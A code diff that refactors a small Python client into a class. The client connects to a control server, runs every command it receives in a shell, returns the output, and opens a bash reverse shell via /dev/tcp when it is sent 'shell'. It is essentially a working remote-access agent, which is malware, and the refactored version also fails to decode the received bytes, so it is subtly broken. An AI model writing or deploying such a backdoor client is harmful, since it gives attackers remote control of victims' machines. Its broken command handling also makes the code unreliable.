@@ -6,39 +6,43 @@ import subprocess
 BUFFER = 4096
 
 
-def processcmd(cmd, sock):
+class Client:
+    def __init__(self):
+        self.sock = 0
+        self.cmd = 0
+    def processcmd(self):
 
-    if len(cmd) > 1:
-        print(cmd)
+        if len(self.cmd) > 1:
+            print(self.cmd)
 
-        if cmd == "shell":
-            subprocess.run("bash -i >& /dev/tcp/127.0.0.1/8888 0>&1", shell=True)
+            if self.cmd == "shell":
+                subprocess.run("bash -i >& /dev/tcp/127.0.0.1/8888 0>&1", shell=True)
+            
+            else:
+                j = subprocess.getoutput(self.cmd)
+                self.sock.send(j.encode())
+
+    def start(self):
         
-        else:
-            j = subprocess.getoutput(cmd)
-            sock.send(j.encode())
+        print(Fore.GREEN + "Starting client" + Fore.RESET)
 
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+        while True:
 
-def main():
-    
-    print(Fore.GREEN + "Starting client" + Fore.RESET)
+            try:
+                self.sock.connect(("127.0.0.1", 9999))
+                print(Fore.GREEN + "Connected to server" + Fore.RESET)
+                self.sock.send(b"Hey")
+                while True:
+                    self.cmd = self.sock.recv(BUFFER)
+                    
+                    self.processcmd()
 
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    while True:
-
-        try:
-            s.connect(("127.0.0.1", 9999))
-            print(Fore.GREEN + "Connected to server" + Fore.RESET)
-            s.send(b"Hey")
-            while True:
-                cmd = s.recv(BUFFER)
-                
-                processcmd(cmd.decode(), s)
-
-        except:
-            pass
+            except:
+                pass
                 
 
-main()
+c = Client()
+
+c.start()
